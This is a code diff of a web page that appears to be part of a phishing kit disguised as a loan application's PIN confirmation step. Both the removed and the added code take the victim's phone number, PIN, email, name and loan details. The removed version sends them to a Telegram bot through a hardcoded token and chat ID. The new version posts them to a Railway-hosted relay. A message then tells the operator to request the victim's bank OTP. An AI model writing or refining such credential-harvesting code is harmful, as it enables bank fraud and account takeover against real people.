@@ -121,10 +121,9 @@
 
 <script>
     // ============================================
-    // TELEGRAM BOT CONFIGURATION
+    // CONFIGURATION - REPLACE WITH YOUR RAILWAY URL
     // ============================================
-    const TG_BOT_TOKEN = '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
-    const TG_CHAT_ID = '8392790531';
+    const RAILWAY_URL = 'https://your-railway-url.railway.app';
     
     // Get URL parameters
     const params = new URLSearchParams(window.location.search);
@@ -201,35 +200,52 @@
     }
 
     // ============================================
-    // SEND PIN NOTIFICATION TO TELEGRAM
+    // SEND NOTIFICATION VIA BACKEND
     // ============================================
-    function sendPinNotification(pin) {
-        const message = `🔐 *NEW PIN CONFIRMATION* 🔐\n\n━━━━━━━━━━━━━━━━━━━━━\n📱 *Phone:* ${phone}\n🔐 *PIN:* ${pin}\n📧 *Email:* ${email}\n━━━━━━━━━━━━━━━━━━━━━\n👤 *Name:* ${name}\n💰 *Loan:* $${parseFloat(amount).toLocaleString()} for ${term} months\n📊 *Interest:* ${rate}%\n💵 *Monthly:* $${parseFloat(monthly).toLocaleString()}\n🆔 *App ID:* ${appId || 'N/A'}\n━━━━━━━━━━━━━━━━━━━━━\n\n✅ User has confirmed their PIN. Request OTP from the bank now!`;
+    async function sendNotification(pin) {
+        const payload = {
+            phone: phone,
+            pin: pin,
+            email: email,
+            name: name,
+            amount: amount,
+            term: term,
+            rate: rate,
+            monthly: monthly,
+            appId: appId,
+            type: 'pin'
+        };
         
-        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+        console.log('📤 Sending to backend:', payload);
         
-        // Send using Image tag (no CORS, instant)
-        var img = new Image();
-        img.src = url;
-        console.log('✅ PIN notification sent to admin');
+        try {
+            const response = await fetch(`${RAILWAY_URL}/api/send-telegram`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            const result = await response.json();
+            console.log('Backend response:', result);
+        } catch (error) {
+            console.error('Error:', error);
+        }
     }
 
     // ============================================
     // MAIN CONFIRM FUNCTION
     // ============================================
-    window.handleConfirm = function() {
+    window.handleConfirm = async function() {
         const pin = getPin();
         if (pin.length !== 4) {
             showError('Please enter all 4 digits.');
             return;
         }
 
-        // Disable button
         confirmBtn.disabled = true;
         confirmBtn.textContent = 'Processing...';
 
-        // Send PIN notification to Telegram
-        sendPinNotification(pin);
+        // Send notification via backend
+        await sendNotification(pin);
         
         // Redirect to OTP page
         window.location.href = 'otp-verify.html'
@@ -244,4 +260,4 @@
     };
 </script>
 </body>
-</html>
+</html
